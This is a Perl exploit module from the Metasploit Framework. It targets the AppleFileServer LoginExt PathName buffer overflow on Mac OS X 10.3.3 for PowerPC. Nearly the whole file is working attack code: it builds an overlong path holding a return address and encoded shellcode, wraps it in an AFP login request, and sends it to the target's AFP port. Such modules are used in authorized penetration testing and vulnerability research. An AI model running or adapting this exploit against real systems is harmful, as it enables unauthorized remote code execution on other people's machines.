
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors fields below. In the
# case of an Unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors fields below. In the
# case of an Unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##


package Msf::Exploit::afp_loginext;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'AppleFileServer LoginExt PathName Buffer Overflow',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
    'Arch'  => [ 'ppc' ],
    'OS'    => [ 'osx' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The AFP port', 548],
                   },
                
    'Payload' => {
                    'Space'     => 512,
                    'BadChars'  => '',
                    'MinNops'   => 64,
                 },
    
    'Description'  => qq{

    },
    'Refs'  =>  [  
                    'http://www.osvdb.org/5762',
                ],
    'Targets' => [ 
                    ["Mac OS X 10.3.3",   0xf0101c0c],
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;

    my $target = $self->Targets->[$target_idx];

    my $path = "\xff" x 1024;

    substr($path, 168,  4, pack('N', $target->[1]));
    substr($path, 172, length($shellcode), $shellcode);

    my $afp = "\x3F\x00\x00\x00".
              pack('C',length("AFP3.1"))."AFP3.1".
              pack('C',length("Cleartxt Passwrd"))."Cleartxt Passwrd".
              "\x03".   # user type
              pack('n',length("metasploit"))."metasploit".
              "\x03".   # afp path type
              pack('n',32).$path;
            
    my $req =
        pack('CCnNNN',
                0,                  # Flags
                2,                  # Command
                rand() * 0xffff,    # Request ID
                0,                  # Data Offset
                length($afp),       # Data Length
                0,                  # Reserved
            ).
            $afp;

    my $s = Msf::Socket->new();
    if (! $s->Tcp($target_host, $target_port)) {
        $self->PrintLine("[*] ". $s->GetError);
        return(0);
    }
    
    $s->Send($req);

    return;
}



